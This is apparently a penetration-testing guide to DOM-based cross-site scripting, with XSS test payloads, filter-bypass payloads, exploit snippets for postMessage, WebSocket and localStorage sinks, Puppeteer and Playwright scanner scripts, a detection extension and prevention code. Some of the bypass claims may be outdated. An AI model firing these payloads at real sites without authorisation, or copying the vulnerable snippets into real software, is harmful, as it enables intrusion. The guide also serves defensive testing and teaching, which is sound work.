# DOM XSS Scanner - Client-Side XSS Detection Tools

Specialized tools for detecting and exploiting DOM-based Cross-Site Scripting vulnerabilities in client-side code.

## DOM XSS Overview

DOM-based XSS occurs when client-side JavaScript processes user input and dynamically updates the DOM without proper sanitization. Unlike reflected or stored XSS, the malicious payload never reaches the server.

### Common DOM XSS Sinks
```javascript
// Dangerous DOM manipulation methods
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// URL-based sinks
location.href
location.replace()
location.assign()
window.open()

// Script execution sinks
eval()
Function()
setTimeout()
setInterval()
execScript()

// Event handler sinks
element.onclick
element.onload
element.onerror
```

## Manual DOM XSS Detection

### Source Analysis
```javascript
// Common DOM XSS sources
location.search          // ?param=value
location.hash            // #fragment  
location.pathname        // /path/to/page
document.referrer        // Referrer header
document.cookie          // Cookie values
postMessage events       // Cross-frame messaging
localStorage/sessionStorage

// Example vulnerable code
var userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;
// Exploit: page.html#<img src=x onerror=alert('XSS')>
```

### Testing Methodology
```bash
# URL fragment testing
http://target.com/page.html#<script>alert('DOM XSS')</script>
http://target.com/page.html#<img src=x onerror=alert('XSS')>

# Search parameter testing
http://target.com/search?q=<script>alert('XSS')</script>
http://target.com/page?name=<svg onload=alert('XSS')>

# Path-based testing
http://target.com/<script>alert('XSS')</script>
```

## DOMPurify Bypass Techniques

### Mutation XSS (mXSS)
```html
<!-- Template tag bypass -->
<template><script>alert('XSS')</script></template>

<!-- SVG namespace bypass -->
<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>

<!-- MathML bypass -->
<math><annotation-xml encoding="text/html"><script>alert('XSS')</script></annotation-xml></math>

<!-- Form bypass -->
<form><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert('XSS')">CLICK</maction></math></form>
```

### CSS-Based DOM XSS
```css
/* CSS expression (IE) */
div { background: expression(alert('XSS')); }

/* CSS url() bypass */
div { background: url('javascript:alert("XSS")'); }

/* @import bypass */
<style>@import 'javascript:alert("XSS")';</style>
```

## Automated DOM XSS Tools

### Domdig - DOM XSS Scanner
```bash
# Installation
npm install -g domdig

# Basic scanning
domdig -u http://target.com

# Specific parameter testing
domdig -u "http://target.com/page?param=test" -p param

# Crawler mode
domdig -u http://target.com -c 3

# Custom payloads
domdig -u http://target.com -f payloads.txt
```

### DOM XSS Scanner Script
```javascript
#!/usr/bin/env node
const puppeteer = require('puppeteer');

class DOMXSSScanner {
    constructor() {
        this.sources = [
            'location.search',
            'location.hash', 
            'location.pathname',
            'document.referrer',
            'document.cookie'
        ];
        
        this.sinks = [
            'innerHTML',
            'outerHTML',
            'document.write',
            'eval',
            'setTimeout',
            'location.href'
        ];
    }
    
    async scanPage(url) {
        const browser = await puppeteer.launch();
        const page = await browser.newPage();
        
        // Monitor console for XSS alerts
        page.on('dialog', dialog => {
            console.log(`XSS Alert detected: ${dialog.message()}`);
            dialog.dismiss();
        });
        
        // Test various payloads
        const payloads = [
            '#<script>alert("DOM XSS")</script>',
            '#<img src=x onerror=alert("XSS")>',
            '?test=<svg onload=alert("XSS")>',
            '#"><script>alert("XSS")</script>'
        ];
        
        for (const payload of payloads) {
            try {
                await page.goto(`${url}${payload}`);
                await page.waitForTimeout(2000);
                
                // Check for DOM modifications
                const hasXSS = await page.evaluate(() => {
                    return document.body.innerHTML.includes('<script>') ||
                           document.body.innerHTML.includes('onerror=') ||
                           document.body.innerHTML.includes('onload=');
                });
                
                if (hasXSS) {
                    console.log(`Potential DOM XSS found with payload: ${payload}`);
                }
            } catch (error) {
                console.error(`Error testing ${url}${payload}: ${error.message}`);
            }
        }
        
        await browser.close();
    }
}

// Usage
const scanner = new DOMXSSScanner();
scanner.scanPage('http://target.com/page.html');
```

### Browser Extension for DOM XSS Detection
```javascript
// content_script.js
class DOMXSSDetector {
    constructor() {
        this.monitoredFunctions = [
            'document.write',
            'document.writeln',
            'eval',
            'setTimeout',
            'setInterval'
        ];
        this.setupMonitoring();
    }
    
    setupMonitoring() {
        // Override dangerous functions
        const originalWrite = document.write;
        document.write = function(content) {
            if (this.isDangerous(content)) {
                console.warn('Potential DOM XSS detected in document.write:', content);
            }
            return originalWrite.call(document, content);
        }.bind(this);
        
        // Monitor innerHTML changes
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            this.checkForXSS(node);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    isDangerous(content) {
        const xssPatterns = [
            /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
            /javascript:/gi,
            /on\w+\s*=/gi,
            /<iframe[^>]*src\s*=\s*["']?javascript:/gi
        ];
        
        return xssPatterns.some(pattern => pattern.test(content));
    }
    
    checkForXSS(element) {
        if (this.isDangerous(element.outerHTML)) {
            console.warn('Potential DOM XSS detected in element:', element);
            element.style.border = '2px solid red';
            element.title = 'Potential XSS detected';
        }
    }
}

new DOMXSSDetector();
```

## Advanced DOM XSS Techniques

### PostMessage XSS
```javascript
// Vulnerable receiver
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
});

// Exploit payload
<iframe src="http://target.com/page.html"></iframe>
<script>
setTimeout(function() {
    frames[0].postMessage('<img src=x onerror=alert("XSS")>', '*');
}, 1000);
</script>
```

### WebSocket DOM XSS
```javascript
// Vulnerable WebSocket handler
ws.onmessage = function(event) {
    document.getElementById('messages').innerHTML += event.data;
};

// Exploit via WebSocket injection
ws.send('<script>alert("XSS")</script>');
```

### Storage-Based DOM XSS
```javascript
// Vulnerable code using localStorage
var userPref = localStorage.getItem('theme');
document.body.innerHTML = '<div class="' + userPref + '">Content</div>';

// Exploit by setting malicious localStorage value
localStorage.setItem('theme', '"><script>alert("XSS")</script><div class="');
```

### JSON-Based DOM XSS
```javascript
// Vulnerable JSON processing
var data = JSON.parse(userInput);
document.getElementById('result').innerHTML = data.message;

// Exploit with crafted JSON
{"message": "<img src=x onerror=alert('XSS')>"}
```

## DOM XSS Prevention

### Safe DOM Manipulation
```javascript
// Safe: Use textContent instead of innerHTML
element.textContent = userInput;

// Safe: Use createElement and appendChild
var div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);

// Safe: Use insertAdjacentText
element.insertAdjacentText('beforeend', userInput);

// Safe: Sanitize with DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Input Validation
```javascript
// Whitelist approach
function isValidInput(input) {
    const allowedPattern = /^[a-zA-Z0-9\s]+$/;
    return allowedPattern.test(input);
}

// HTML encoding
function htmlEncode(str) {
    return str.replace(/[&<>"']/g, function(match) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;'
        };
        return map[match];
    });
}

// URL encoding for location-based sinks
function urlEncode(str) {
    return encodeURIComponent(str);
}
```

## Testing Tools and Frameworks

### Playwright DOM XSS Scanner
```javascript
const { chromium } = require('playwright');

async function scanDOMXSS(url) {
    const browser = await chromium.launch();
    const page = await browser.newPage();
    
    // Set up XSS detection
    await page.addInitScript(() => {
        window.xssDetected = false;
        
        // Override alert to detect XSS
        window.alert = function(msg) {
            window.xssDetected = true;
            window.xssMessage = msg;
        };
    });
    
    const testCases = [
        { source: 'hash', payload: '#<script>alert("XSS")</script>' },
        { source: 'search', payload: '?q=<img src=x onerror=alert("XSS")>' },
        { source: 'pathname', payload: '/<script>alert("XSS")</script>' }
    ];
    
    for (const testCase of testCases) {
        await page.goto(`${url}${testCase.payload}`);
        await page.waitForTimeout(2000);
        
        const xssDetected = await page.evaluate(() => window.xssDetected);
        if (xssDetected) {
            const message = await page.evaluate(() => window.xssMessage);
            console.log(`DOM XSS detected via ${testCase.source}: ${message}`);
        }
    }
    
    await browser.close();
}

scanDOMXSS('http://target.com/page.html');
```

### Comprehensive DOM Analysis
```javascript
// Analyze page for potential DOM XSS vectors
function analyzePage() {
    const analysis = {
        sources: [],
        sinks: [],
        vulnerabilities: []
    };
    
    // Check for common sources
    if (document.location.search) analysis.sources.push('location.search');
    if (document.location.hash) analysis.sources.push('location.hash');
    if (document.referrer) analysis.sources.push('document.referrer');
    
    // Check for dangerous sinks
    const scripts = document.querySelectorAll('script');
    scripts.forEach(script => {
        const content = script.textContent;
        if (content.includes('innerHTML')) analysis.sinks.push('innerHTML');
        if (content.includes('document.write')) analysis.sinks.push('document.write');
        if (content.includes('eval')) analysis.sinks.push('eval');
    });
    
    // Test for basic DOM XSS
    const testPayload = '<img src=x onerror=console.log("DOM_XSS_TEST")>';
    
    // Simulate various injection points
    if (analysis.sources.includes('location.hash')) {
        // Test hash-based injection
        const originalHash = location.hash;
        location.hash = testPayload;
        setTimeout(() => {
            location.hash = originalHash;
        }, 1000);
    }
    
    return analysis;
}

// Run analysis
console.log(analyzePage());
```

Specialized toolkit for comprehensive DOM-based XSS detection, analysis, and exploitation in modern web applications.
